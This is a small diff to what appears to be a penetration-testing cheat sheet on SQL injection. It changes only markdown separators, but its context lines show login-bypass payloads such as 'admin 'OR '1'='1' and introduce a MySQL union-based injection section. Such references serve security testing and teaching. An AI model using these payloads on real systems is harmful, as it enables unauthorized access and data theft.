@@ -1,5 +1,5 @@
 ## Authentication bypass methods:
----
+
 ```
 admin ' -- -
 admin 'OR '1'='1
@@ -19,7 +19,7 @@ admin ' OR 1=1;--
 ```
 
 ## Union based SQL Injection
----
+
 #### NOTE
 *The following is using MySQL as the example DBMS to demonstrate the enumeration methodology to perform Union based SQL Injection.*
 
